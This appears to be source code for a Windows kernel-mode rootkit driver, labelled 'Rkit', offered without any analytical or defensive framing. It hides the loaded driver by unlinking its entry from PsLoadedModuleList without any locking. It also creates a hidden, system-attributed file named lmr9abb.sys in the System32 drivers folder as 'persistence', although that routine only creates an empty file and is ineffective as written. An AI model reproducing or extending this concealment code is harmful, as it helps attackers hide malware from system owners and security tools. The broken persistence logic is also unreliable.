/*
//================================
#include <ntddk.h>

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Rkit Unloading......\n");
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
    (void)DriverObject;
    UNREFERENCED_PARAMETER(RegistryPath);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Rkit Driver Loaded.......\n");

    DriverObject->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}
//================================
*/

#include <ntddk.h>
#include "log_utils.h"

extern PVOID PsLoadedModuleList;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject);
VOID HideDriver(PDRIVER_OBJECT DriverObject);
VOID RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject);
NTSTATUS InstallFilePersistence(VOID);

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
    (void)DriverObject;
    UNREFERENCED_PARAMETER(RegistryPath);
    LogMessage("[+] Basic Driver Loaded\n");

    DriverObject->DriverUnload = DriverUnload;
    HideDriver(DriverObject);

    // Install file-based persistence
    if (!NT_SUCCESS(InstallFilePersistence())) {
        LogMessage("[-] Failed to install file-based persistence.\n");
    }

    return STATUS_SUCCESS;
}

VOID HideDriver(PDRIVER_OBJECT DriverObject) {
    (void)DriverObject;
    RemoveFromLoadedModulesList(DriverObject);
    LogMessage("[+] Driver hidden from PsLoadedModuleList\n");
}

VOID RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject) {
    (void)DriverObject;
    PLIST_ENTRY moduleList = (PLIST_ENTRY)PsLoadedModuleList;
    PLIST_ENTRY currentEntry = moduleList->Flink;
    PLDR_DATA_TABLE_ENTRY current;

    while (currentEntry != moduleList) {
        current = CONTAINING_RECORD(currentEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (current->DllBase == DriverObject->DriverStart) {
            current->InLoadOrderLinks.Blink->Flink = current->InLoadOrderLinks.Flink;
            current->InLoadOrderLinks.Flink->Blink = current->InLoadOrderLinks.Blink;
            LogMessage("[+] Driver unlinked from PsLoadedModuleList.\n");
            break;
        }
        currentEntry = currentEntry->Flink;
    }
}

// File-based persistence mechanism
NTSTATUS InstallFilePersistence(VOID) {
    // Define the path to the driver file in a location that persists across reboots
    WCHAR filePath[] = L"\\SystemRoot\\System32\\drivers\\lmr9abb.sys";
    OBJECT_ATTRIBUTES objAttr;
    HANDLE fileHandle;
    IO_STATUS_BLOCK ioStatus;
    UNICODE_STRING fileName;
    NTSTATUS status;

    RtlInitUnicodeString(&fileName, filePath);
    InitializeObjectAttributes(&objAttr, &fileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    // Open the file
    status = ZwCreateFile(&fileHandle, GENERIC_WRITE | SYNCHRONIZE, &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, FILE_SHARE_READ, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (NT_SUCCESS(status)) {
        ZwClose(fileHandle);
        LogMessage("[+] File-based persistence installed.\n");
    }
    else {
        LogMessage("[-] Failed to install file-based persistence. Status: 0x%X\n", status);
    }

    return status;
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    LogMessage("[+] Basic Driver Unloading......\n");
    CloseLogFile();
}
